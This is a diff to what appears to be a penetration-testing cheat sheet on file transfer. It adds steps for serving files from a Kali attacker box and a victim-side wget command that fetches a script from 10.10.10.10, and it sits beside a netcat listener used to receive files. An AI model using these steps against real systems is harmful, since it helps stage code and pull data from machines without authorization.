@@ -60,10 +60,12 @@ nc -lvp 4444 > file.txt
 *Kali:*
 ```
 python3 -m http.server 8888 
+python -m SimpleHTTPServer 8888
 ```
 
+*Victim:*
 ```
-python -m SimpleHTTPServer 8888
+wget http://10.10.10.10:8888/script.sh -O script.sh
 ```
 
 * #### With SCP
